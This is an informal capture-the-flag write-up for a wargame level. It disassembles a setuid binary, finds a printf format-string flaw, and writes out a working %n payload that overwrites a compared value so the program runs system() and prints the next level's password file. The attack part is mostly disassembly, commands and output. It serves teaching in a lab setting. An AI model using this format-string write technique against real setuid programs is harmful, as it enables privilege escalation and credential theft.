ll
|
L-> -rwsr-s---+ 1 level5 users  5366 Mar  6  2016 level4*

./level4

wait for an input
and copy back it

I tried some long string with python but it only print some char (511 + enter = 512)

lets dump it

objdump -d level4
08048444 <p>:
 8048444:       55                      push   %ebp
 8048445:       89 e5                   mov    %esp,%ebp
 8048447:       83 ec 18                sub    $0x18,%esp
 804844a:       8b 45 08                mov    0x8(%ebp),%eax
 804844d:       89 04 24                mov    %eax,(%esp)
 8048450:       e8 eb fe ff ff          call   8048340 <printf@plt>
 8048455:       c9                      leave
 8048456:       c3                      ret

08048457 <n>:
 8048457:       55                      push   %ebp
 8048458:       89 e5                   mov    %esp,%ebp
 804845a:       81 ec 18 02 00 00       sub    $0x218,%esp
 8048460:       a1 04 98 04 08          mov    0x8049804,%eax
 8048465:       89 44 24 08             mov    %eax,0x8(%esp)
 8048469:       c7 44 24 04 00 02 00    movl   $0x200,0x4(%esp)
 8048470:       00
 8048471:       8d 85 f8 fd ff ff       lea    -0x208(%ebp),%eax
 8048477:       89 04 24                mov    %eax,(%esp)
 804847a:       e8 d1 fe ff ff          call   8048350 <fgets@plt>
 804847f:       8d 85 f8 fd ff ff       lea    -0x208(%ebp),%eax
 8048485:       89 04 24                mov    %eax,(%esp)
 8048488:       e8 b7 ff ff ff          call   8048444 <p>
 804848d:       a1 10 98 04 08          mov    0x8049810,%eax
 8048492:       3d 44 55 02 01          cmp    $0x1025544,%eax
 8048497:       75 0c                   jne    80484a5 <n+0x4e>
 8048499:       c7 04 24 90 85 04 08    movl   $0x8048590,(%esp)
 80484a0:       e8 bb fe ff ff          call   8048360 <system@plt>
 80484a5:       c9                      leave
 80484a6:       c3                      ret

080484a7 <main>:
 80484a7:       55                      push   %ebp
 80484a8:       89 e5                   mov    %esp,%ebp
 80484aa:       83 e4 f0                and    $0xfffffff0,%esp
 80484ad:       e8 a5 ff ff ff          call   8048457 <n>
 80484b2:       c9                      leave
 80484b3:       c3                      ret


so the main call n() which make a fget then print the result from p() and if cmp    $0x1025544,%eax it make a system()
I tried in gdb to bypass the cmp and it returned me: 
/bin/cat: /home/user/level5/.pass: Permission denied
so the system execute a cat on the .pass so we need to edit the value of eax as before

let's first find what is in 0x0804848d

gdb level4
(gdb) break *0x0804848d
(gdb) r <<< $(echo a)
a
(gdb) print 0x0804848d
|
L-> $1 = 16930116
(gdb) exit
now let's try if it's a non-proteged printf as before
./level4
%x %x %x
|
L-> b7ff26b0 bffff794 b7fd0ff4
yes it is now we need to find our compared pointer
python -c 'print "\x10\x98\x04\x08" + " %x %x %x %x %x %x %x %x %x %x %x %x"' | ./level4
|
L->  b7ff26b0 bffff794 b7fd0ff4 0 0 bffff758 804848d bffff550 200 b7fd1ac0 b7ff37d0 8049810

so our pointer is at the 12th value

so the string "b7ff26b0 bffff794 b7fd0ff4 0 0 bffff758 804848d bffff550 200 b7fd1ac0 b7ff37d0 " is 79 char long

but I found the printf trick to just do %12$x to access to the 12th %x like we want to edit the value the x will turn in n

16930116 - 4 (address) = 16930112
let's try 
python -c 'print "\x10\x98\x04\x08" + "a"*16930112 + "%12$n"' | ./level4
but it's too long and not work
but with a little trick of printf we can make:

python -c 'print "\x10\x98\x04\x08" + "%016930112x%12$n"' | ./level4

to edit the precision and so print 16930112 of 0 and so edit the value of our address

then we got the pass